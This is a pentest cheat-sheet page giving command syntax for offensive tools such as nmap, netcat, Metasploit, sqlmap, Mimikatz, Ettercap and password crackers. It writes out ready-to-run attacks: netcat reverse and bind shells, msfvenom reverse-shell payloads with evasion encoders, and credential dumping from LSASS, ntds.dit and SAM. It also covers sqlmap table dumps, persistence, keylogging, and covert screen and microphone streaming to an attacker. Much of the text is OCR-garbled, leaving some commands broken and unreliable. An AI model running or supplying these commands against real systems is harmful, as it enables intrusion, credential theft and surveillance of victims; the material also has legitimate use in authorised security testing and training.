---
title: Tool Syntax
sidebar: mydoc_sidebar
permalink: tool_syntax.html
folder: mydoc
---


# How to use the tools



## Nmap command

### Scanning methods

| Switch Explanation
| :--- | :--- |
| -sp | Scan with ping
| -sS | Scanning with syn |
| -sT | Scanning with connection
| -sU | Scanning with udp
| -so | Scanning with protocol
| -sv | Scanning along with versions
| -sC | Scanning with traceroute
| -T4 Setting the scanning speed between 0 and 5
| -oA | Scanning output with all formats
| -iL list.txt | Scan the contents of the list


### Capabilities

| Switch Explanation
| :--- | :--- |
| -ox file | Write inside the xml file
| -oG file | Writing inside the grep file
| -oA file | Storage with 3 formats
| -iL file | Reading hosts from inside my file
| -exclude file file | Except for the hosts in the file

### Advanced features

| Switch Explanation
| :--- | :--- |
| -sV -p --script=banner | Banners
| --traceroute | Draw a route map
| --ttl | ttl code
| --script | Script

### Firewall evasion

| Switch Explanation
| :--- | :--- |
| -f| Crossed fasteners
| -s ip | source spoof |
| -g \# | spoof source port |
| -D ip , ip | Bait |
| --mtu \# | Setting the MTU size
| --spoof-mac mac | spoof mac address |
| --data-length size | Size |
| --scan-delay script | Script
| --min-rate=X | Determining the minimum number of requests sent per second

### Convert xml output to html

```text
xsltproc nmap.xml -o nmap.html
```

### Create active hosts

```text
nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" | cut -d " " -f
5 live hosts.txt
```

### Compare nmap results


```text
ndiff scanl.xml scan2.xml
```

### reverse dns lookup in ip range

```text
nmap -R -sL -dns-server server 1.1.1.0/24
```

### ids test (xmas scan with ips bait and spoofing)

```text
for x in {1 .. lOOOO .. 1);do nmap -T5 -sX -S spoof-source-IP -D
comma-separated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff
-e eth0 -Pn targeted-IP. Done
```

### List of nmap scripts

| name | Explanation
| :--- | :--- |
| List of shared routes smb-enum-shares.nse |

## Wireshark software

| Filter Explanation
| :--- | :--- |
| eth.addr/eth.dst.eth.src | Mac |
| rip.auth.passwd | Password RIP |
| ip.addr/ip.dst/ip.src \(ipv6.\) | IP |
| tcp.port/tcp.dstport/tcp.srcport | TCP ports
| tcp.flags \(ack,fin,push,reset,syn,urg\) | TCP flags
| udp.port/udp.dstport/udp.srcport | UDP ports
| http.authbasic | Basic authentication authentication
| http.www\_authentication | Authentication of HTTP authentication
| http.data | HTTP data
| http.cookie | HTTP cookies
| http.referer | HTTP referrer path
| http.server | HTTP servers
| http.user agent | The user-agent section in HTTP |
| wlan.fc.type eq 0 | 802.11 management frame |
| wlan.fc.type eq 1 | 802.11 control frame |
| wlan.fc.type eq 0 | 802.11 data frames |
| wlan.fc.type subtype eq 0 \(1=reponse\) | 802.11 association request |
| wlan.fc.type\_subtype eq 2 \(3=response\) | 802.11 reassociation req
| wlan.fc.type\_subtype eq 4 \(5=response\) | 802.11 probe request |
| wlan.fc.type\_subtype eq 8 | 802.11 beacon |
| wlan.fc.type subtype eq 10 | 802.11 disassociate |
| wlan.fc.type=subtype eq 11 \(12=deauthenticate\) | 802.11 authentication

## Command operators

```text
eq OR ==
ne OR !=
gt OR
Lt. OR
ge OR =
le OR =
```

## Logical operators

```text
and OR &&
or OR ||
xor OR ^^
not OR!
```

## Netcat command

### Fundamental

```text
Connect to [TargetiP] Listener on [port]:
$ nc [Target P] [port]

Start Listener:
$ nc -1 -p [port]
```

### Start HTTP SOCKS server at Automation-Server

```
./ncat - l 3128 -proxy -type http &
```

### Scan ports

```text
TCP Port Scanner in port range [startPort] to [endPort]:
$ nc -v -n -z -wl [TargetiP] [startPort]-[endPort]
```

### transfer files

```text
send file
nc.exe 10.10.10.10 < "file.log"

download file
nc -vnlp 1234 > file.txt
```


```text
Grab a [filename] from a Listener:
1. Start Listener to push [filename]
     $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and Retrieve [filename]
     $ nc -w3 [TargetiP] [port] [filename]

Push a [filename] to Listener:
1. Start Listener to pull [filename]
     $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and push [filename]
     $nc -w3 [TargetiP] [port] [filename]
```

### Backdoor shells

```text
Linux Shell:
$ nc -1 -p [port] -e /bin/bash
Linux Reverse Shell:
$ nc [LocaliP] [port] -e /bin/bash
Windows Shell:
$ nc -1 -p [port] -e cmd.exe
Windows Reverse Shell:
$ nc [LocaliP] [port] -e cmd.exe
```

## Use VLC for streaming

```text
Use cvlc \(command line VLC\) on target to migrate popups
```

### Saving and streaming the screen through the udp protocol to the attacker's address and port 1234

```text
# Start a listener on the attacker machine
vlc udp://@:1234

-- OR --

# Start a listener that stores the stream in a file.
vlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,
ab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap
:no-shout-standard-sap :ttl=1 :shout-keep

# This may make the users screen flash. Lower frame rates delay the video.
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst=attackerip :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep
```


### Save and stream the screen in http protocol

```text
# Start a listener on the attacker machine
     vlc http://server.example.org:BOBO

-- OR --

# Start a listener that stores the stream to a file
vlc http://server.example.org:BOBO -sout=#
transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp
rate=44100):file{dst=test.mp4)

# Start streaming on the target machine
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :nosout-
standard-sap :ttl=1 :sout-keep
```

### Save and stream on broadcast

```text
# Start a listener on attacker machine for multicast
vlc udp://@ multicastaddr :1234

# Broadcast stream to a multicast address
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep
```

### Save and record the screen in a file

```text
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):file{dst=C:\\Program Files (x86)\\VideoLAN\\VLC\\test.mp4)
:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep
```

### Record and stream microphone on udp

```text
vlc dshow:// :dshow-vdev="None" :dshow-adev="Your Audio Device"
```

## SSH command

```text
/etc/ssh/ssh known hosts #System-wide known hosts
-/.ssh/known_hosts #Hosts user has logged into
sshd-generate #Generate SSH keys (DSA/RSA)
ssh keygen -t dsa -f /etc/ssh/ssh_host_dsa_key #Generate SSH DSA keys
ssh keygen -t rsa -f /etc/ssh/ssh_host_rsa_key #Generate SSH RSA keys

If already in ssh session, press SHIFT -C to configure tunnel
Port forwarding must be allowed on the target
/etc/ssh/sshd_config - AllowTcpForwarding YES
```

### Connect with ssh with specific port

```text
ssh root@2.2.2.2 -p 8222
```

### Reverse port forwarding using the tunnel (in the support user reverse shell)

```
ssh -R 4446:127.0.0.1:3128 master@192.168.2.2
http 127.0.0.1 4446
```

### Set x11 victim to attacker

```text
xhost+
vi -/.ssh/config- Ensure 'ForwardXll yes'
ssh -X root@2.2.2.2
```

### Create port forward on port 8080 and transfer to port 443 of the attacker

```text
ssh -R8080:12-.0.0.1:443 root@2.2.2.2.
```

### Using port forward on the attacker's port 8080 and transferring information using ssh tunnel and port 3300 3.3.3.3

```text
ssh -18080:3.3.3.3:443 root@2.2.2.2
```

### Dynamic tunnel using proxychain. Also, the file /etc/proxychain.conf to set the port \(1080\)

```text
ssh -D1080 root@2.2.2.2
In a separate terminal run:
proxychains nmap -sT -p80,443 3.3.3.3
```
# Create multi-hop ssh tunnel

```text
ssh -L 8888:127.0.0.1:8444 50mctf@MY_VPS
ssh -v -o PubkeyAuthentication=no -o PreferredAuthentications=password -o GatewayPorts=yes -fN -R *:8444:172.28.0.3:80 50mctf@MY_VPS
```

## Metasploit software


<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">msfconsole r file.rc</td>
       <td style="text-align:left">Load resource file</td>
     </tr>
     <tr>
       <td style="text-align:left">msfcli | grep exploit/window</td>
       <td style="text-align:left">List of Windows exploits</td>
     </tr>
     <tr>
       <td style="text-align:left">rnsfencode -l</td>
       <td style="text-align:left">list of encodes</td>
     </tr>
     <tr>
       <td style="text-align:left">msfpayload -h</td>
       <td style="text-align:left">List of payloads</td>
     </tr>
     <tr>
       <td style="text-align:left">show exploits</td>
       <td style="text-align:left">Display exploits</td>
     </tr>
     <tr>
       <td style="text-align:left">show auxiliary</td>
       <td style="text-align:left">show auxiliary module</td>
     </tr>
     <tr>
       <td style="text-align:left">show payloads</td>
       <td style="text-align:left">Show payloads</td>
     </tr>
     <tr>
       <td style="text-align:left">search string</td>
       <td style="text-align:left">Search for a specific string</td>
     </tr>
     <tr>
       <td style="text-align:left">search exploit string</td>
       <td style="text-align:left">Search exploits</td>
     </tr>
     <tr>
       <td style="text-align:left">searchsploit -m exploits/php/webapps/45161.py</td>
       <td style="text-align:left">Copy the Xploit file in the current path</td>
     </tr>
     <tr>
       <td style="text-align:left">info module</td>
       <td style="text-align:left">Display module information</td>
     </tr>
     <tr>
       <td style="text-align:left">use module</td>
       <td style="text-align:left">Load Xploit or Module</td>
     </tr>
     <tr>
       <td style="text-align:left">show options</td>
       <td style="text-align:left">Display module properties</td>
     </tr>
     <tr>
       <td style="text-align:left">show advanced</td>
       <td style="text-align:left">Show advanced settings</td>
     </tr>
     <tr>
       <td style="text-align:left">set option value</td>
       <td style="text-align:left">Set value</td>
     </tr>
     <tr>
       <td style="text-align:left">sessions -v</td>
       <td style="text-align:left">List of meetings: -k # (delete)
         <br />-u # (Update Meterpreter)</td>
     </tr>
     <tr>
       <td style="text-align:left">sessions -s script</td>
       <td style="text-align:left">Run the Meterpreter script in all sessions</td>
     </tr>
     <tr>
       <td style="text-align:left">jobs -l</td>
       <td style="text-align:left">List all jobs (-k # - kill)</td>
     </tr>
     <tr>
       <td style="text-align:left">exploit -j</td>
       <td style="text-align:left">Run exploit as job</td>
     </tr>
     <tr>
       <td style="text-align:left">route add ip nmask sid</td>
       <td style="text-align:left">Rotation or Pivoting</td>
     </tr>
     <tr>
       <td style="text-align:left">loadpath /home/modules</td>
       <td style="text-align:left">Load tradeparty tree</td>
     </tr>
     <tr>
       <td style="text-align:left">irb</td>
       <td style="text-align:left">shell ruby implementation</td>
     </tr>
     <tr>
       <td style="text-align:left">connect -s ip 443</td>
       <td style="text-align:left">connect to ssl (NC clone)</td>
     </tr>
     <tr>
       <td style="text-align:left">route add ip mask session id</td>
       <td style="text-align:left">added route &#xB7;in the pivot</td>
     </tr>
     <tr>
       <td style="text-align:left">exploit/multi/handler - set ExitOnSession False</td>
       <td style="text-align:left">
         <p>Show more settings</p>
         <p>Shells</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>set ConsoleLogging true (also</p>
         <p>SessionLogging)</p>
       </td>
       <td style="text-align:left">Enable reporting</td>
     </tr>
   </tbody>
</table>


## Sqlmap command

### Send request Get


```text
sqlmap.py -u "http://url?id=1&str=val"
```
### Send Post request

```text
sqlmap.py -u "http://url" --data="id=1&str=val"
```

### SQL injection in a specific parameter and knowing the type of database

```text
sqlmap.py -u "http://url" --data="id=l&str=val" -p "id"
-b --dbms="mssqllmysqlloraclelpostgres"
```

### SQL injection on the page requiring authentication

```text
1. Login and note cookie value (cookie1=val1, cookie2=val2)
sqlmap.py -u "http:// url "--data="id=l&str=val" -p "id"
--cookie="cookiel=vall;cookie2=val2"
```

### SQL injection and getting the database version and its name and user

```text
./sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" -b --current-db
--current-user
```

### SQL injection and get database tables db=testdb

```text
sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" --tables -D
"testdb"
```

### SQL injection and receiving table columns

```text
sqlmap.py -u "http://url" --data="id=l&str=val" -p "id" --columns -T
"users"
```

### Read from file

```text
sqlmap.py -r req.txt
```

### Get the records of the specified table from the specified database

```text
sqlmap -r req -D openemr -T users_secure --dump
```

### Using the delay technique

```text
sqlmap -r req --technique=T
```
[more info](https://github.com/sqlmapproject/sqlmap/wiki/Techniques)

### Bypass waf with unicode

```text
sqlmap -r json --tamper=charunicodeescape --dump --level=5 --risk=3 --dbs --columns
```

## msf


### Creating meterpreter payload \(for Linux: -t file -o callback\)

```text
./msfpayload windows/meterpreter/reverse tcp LHOST=ip LPORT=port R |
./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5
```

### Create payload with bound meterpreter

```text
./msfpayload windows/meterpreter/bind_tcp RP.OST=ip LPORT=port X
cb.exe
```

### Creating a Java reverse shell

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=9999 -f WAR > exploit.war
```

### Creating a reverse shell for Windows with msfvenom


```msfvenom -p windows/shell_reverse_tcp lhost=ip lport=port -f exe --platform windows >reverse.exe```

### Generate encoded payload using msfvenom

```text
./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe
template calc.exe -k --encoder x86/shikata_ga_nai -i 5 LHOST=1.1.1.1
LPORT=443 callback.exe
```

### Start database msf \(bt5=mysql,kali=postgresql\)

```text
/etc/rc.d/rc.mysqld start
msf db_create root:pass@localhost/metasploit
msf load db mysql
msf db connect root:pass@localhost/metasploit
msf db=import nmap.xml

--- Kali ---
# service postgresql start
# service metasploit start
```

### return the shell \(by default it will run notepad and injection\)


```text
msf use post/windows/manage/multi meterpreter inject
msf set IPLIST attack ip 
msf set LPORT callback port
msf set PIDLIST PID to inject, default creates new notepad
msf set PAYLOAD windows/meterpreter/reverse_tcp
msf set SESSION meterpreter session ID
```

### Display the html banner in the internal network

```text
msf route add ip/range netmask meterpreter ID
msf use post/multi/gather/ping sweep # Set options and run
msf use /auxiliary/scanner/portscan/tcp # Set options and run
msf hosts-u-S x.x.x -R #Searches for x.x.x.' and sets
# RHOSTS
msf use auxiliary/scanner/http/http version # Set options and run
msf services -v -p 80-S x.x.x -R - #Displays IPs x.x.x.' with port
#80 open
```

## Meterpreter

| **Command** | **Explanation** |
| :--- | :--- |
| Help | List of available commands
| sysinfo | Display system information
| p.s List of processes
| getpid | List of available PID |
| upload file C:\Program Files\ | Upload file
| download file | Get the file
| reg command | Interaction with the registry
| rev2self | Back to main user
| shell | Transfer to interactive shell
| migrate PID | Change to another PID |
| background | The current process behind the background
| keys can \(start\|stop\|dump\) | Start/stop/delete keylogger |
| execute -f cmd.exe -i | Run cmd.exe and interact with it
| execute -f crnd.exe -i -H -t | Run cmd.exe as a hidden process and get all the tokens
| has dump | Get all local hashes
| run script | Running the script \(/scripts/meterpreter\) |
| port fwd \[add I delete\] -lL 127.0.0.1 443 -r 3.3.3.3 -p 3389 | Create port forward on port 3389 in the current session and remote desktop access on port 443 |

### Increasing access level

```text
use priv
getsystem
```

### Impersonation token (removing the token will stop impersonation)

```text
use incognito
list tokens -u
impersonate token domain\\user
```

### Using nmap in meterpreter socks proxy

```text
1. msf sessions #Note Meterpreter ID
2. msf route add 3.3.3.0 255.255.255.0 id
3. msf use auxiliary/server/socks4a
4. msf run
5. Open a new shell and edit /etc/proxychains.conf
i. #proxy_dns
ii. #socks4 127.0.0.1 9050
iii. socks4 1.1.1.1 1080
6. Save and close the conf file
7. proxychains nmap -sT -Pn -p80,:35,s45 3.3.3.3
```

### Railgun - api related to displaying specific messages

```text
meterprete irb
client.railgun.user32.MessageBoxA(O,"got","YOU","MB_OK")
```

### Creating a stable Windows service

```text
msf use post/windows/manage/persistence
msf set LHOST attack ip
msf set LPORT callback port
msf set PAYLOAD_TYPE TCPIHTTPIHTPS
msf set REXENAHE filename
msf set SESSION meterpreter session id
msf set STARTUP SERVICE
```

### Collect the latest requested files and web links

```text
meterpreter run post/windows/gather/dumplinks
```

### Create a new process and command tree c:\

```text
execute -H -f cmd.exe -a '/c tree /F /A c:\ C:\temp\tree.txt'
```

## Ettercap software

### Main-In-Middle attack using filters

```text
ettercap.exe -I iface -M arp -Tq -F file.ef MACs / IPs / Ports
MACs / IPs / Ports
#i.e.: // 80,443 // = any MAC, any IP, ports 80,443
```

### Main-In-Middle attack on subnet with functional fitters

```text
ettercap -T -M arp -F filter // //
```

### Switch flood attack

```text
ettercap -TP rand flood
```

## Ettercap filters

### Compile ettercap filters


```text
etterfilter filter.filter -o out.ef
```

### Example filter - remove vpn traffic and decrypt http traffic

```text
if lip.proto == UDP && udp.dst == 500) I
     drop();
     kill(); }
if I ip.src == 'ip' ) (
     if (tcp.dst == 80) (
         if (search(DATA.data, "Accept-Encoding")) (
             replace("Accept-Encoding","Accept-Rubbish!");
             msg("Replaced Encoding\n");
         }
     }
}
```

### Mimikatz command

```text
1. Upload mimikatz.exe and sekurlsa.dll to target
2. execute mirnikatz
3. mimikatz# privilege: :debug
4. mimikatz# injeet::proeess lsass.exe securlsa.dll
5. mimikatz# @getLogonPasswords
6. securlsa::minidump /users/redteam/Desktop/lsass.DMP
7. securlsa::LogonPasswords
```

Or

```text
mimikatz# sekurlsa::tickets /export
mimikatz# kerberos::ptt <TICKET PATH>
```
Or

```text
#cleartext password and hash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::secrets" "exit"
```

### Hping command3

```text
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

### Arping command

```text
./arping -I eth# -a # arps
```

### Wine command

```text
ed /root/.wine/drive e/HinGW/bin
wine gee -o file.exe /tmp/ eode.e
wine file.exe
```

### Grub software

```text
GRUB Henu: Add 'single' end of kernel line. Reboot. Change root password. reboot
```

### Hydra command

```text
hydra -1 ftp -P words -v targetiP ftp
```

## hashcat software

### NTLMv2 crack

```text
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
```


## John the ripper software

### Crack with word list

```text
$ ./john -wordfile:pw.lst -format: format hash.txt
```

### Sample formats

```text
$ john --format~des    username:SDbsuge8iC58A
$ john --format~lm     username:$L~$a9c604d244c4e99d
$ john --format~md5    $1$12345678$aiccj83HRD8o6ux1bVx7D1

$ john --format~raw-sha1 A9993E364706816A8A3E25717850C26C9CDOD89D

# For --format~netlmv2 replace $NETLM with $NETLMv2
$ john --format~netlm
$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC-318825
username:$NETLM$ll22334455667788$0836F0858124F338958"5F81951905DD2F85252CC7
318825
username:$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC7
318825:::::::

# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)
$ john --format~sapb
ROOT    $8366A4E9E68"2C80
username:ROOT    $8366A4E9E68"2C80

$ john --format=sapg
ROOT $1194E38F1489F3F8DA18181F14DE8"0E"8DCC239
username:ROOT
$1194E38F1489F3F8DA18181F14DE8-0E-8DCC239

$ john --format=sha1-gen
$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb"453dfe30-89
username:$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb-453dfe30-89

$ john --format=zip
$zip$'0'1'8005b1b"d07""08d'dee4
username:$zip$'0'1'8005b1b-d0"-"08d'dee4
```

## List of passwords

### Creating different words based on one word

```text
#Add lower(@), upper(,), ~umber(%), and symbol(^) I to the end of the word
crunch 12 12 -t baseword@,%^ wordlist.txt

Use custom special character set and add 2 numbers then special character
maskprocessor -custom-charset1=\!\@\#\$ baseword?d?d?l wordlist.txt

generate wordlist from website with number
cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
```

## Vsown command

```text
1. Download: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs
2. Create a new Shadow Copj
     a. cscript vssown.vbs /start (optional)
     b. cscript vsown.vbs /create
3. Pull the following files frorr. a shadow copj:
     a. Copy
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     ntds\ntds.dit.
b. copj
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     System32\config\SYSTEM.
     C. COpj
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     system32\config\SAM.
4. Copj files to attack box.
5. Download tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip
6. Configure and Make source code for libesedb from the extracted package
     a. cd libesdb
     b. chmod +x configure
     c. ./configure && make
Use esedbdumphash to extract the data table from ntds.dit.
     a. cd esedbtools
     b. . I esedbdumphash ../../ntds.dit
```

## File hash

### Hash length

```text
MD5 16 bytes
SHA-1 20 bytes
SHA-256 32 bytes
SHA-512 64 bytes
```

### Software with different hash databases

```text
http://isc.sans.edu/tools/hashsearch.html
# dig +short md5 .md5.dshield.org TXT
Result = "filename I source" i.e. "cmd.exe I NIST"
```

### Malware hash database

```text
http://www.team-cymru.org/Services/MHR
# dig +short [MD5|SHA-1].malware.hash.cymru.com TXT
Result = last seen timestamp AV detection rate
Convert timestamp= perl-e 'print scalar localtime( timestamp ), "\n"'
```

### Search in metadata files

```text
https://fileadvisor.bit9.com/services/search.aspx
```

### Search the virustotal database

```text
https://www.virustotal.com/#search
```

## Guess the password of the zip file

```text
fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt secret.zip
```

## Guess the password of the winrm service

```text
crackmapexec winrm <IPS> -u <USERS> -p <PASSWORDS>
```

## Guess the password of the smb service

```text
crackmapexec smb <IP> -u <USER> -p <PASS> --shares
```

## Connect to mssql with impackt

```text
mssqlclient.py -port 1433 sa@10.10.10.10
```

## powershell download files

```
powershell iwr -usebasicparsing http://192.168.2.2/mimikatz.exe -OutFile mimikatz.exe

```

## List of Pods

```
𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑔𝑒𝑡 𝑝𝑜𝑑
```

## Check if you have rights to exec into any pods

```
./𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑎𝑢𝑡ℎ 𝑐𝑎𝑛 − 𝑖 𝑒𝑥𝑒𝑐 𝑝𝑜𝑑𝑠
```

## exec into sensitive-pod

```
./𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑒𝑥𝑒𝑐 − 𝑖𝑡 𝑠𝑒𝑛𝑠𝑖𝑡𝑖𝑣𝑒 − 𝑝𝑜𝑑 /𝑏𝑖𝑛/𝑏𝑎𝑠ℎ
```

## More information about the environment

```
kubectl get nodes -o wide
```


## RouterSploit

### Discover Devices

```
python rsf.py -m discovery
```

### Scan for vulnerabilities

```
python rsf.py -m vulnerability
```


### Brute Force

```
python rsf.py -m bruteforce
```


### Exploit vulnerabilities

```
python rsf.py -m exploit
```


### Generate Payloads

```
python rsf.py -m payloads
```


### Sniffing

```
python rsf.py -m sniffer
```


### Dos Attacks

```
python rsf.py -m dos
```

### Password Attacks

```
python rsf.py -m password
```

### Shodan Integration

```
python rsf.py -m shodan
```





{% include links.html %}
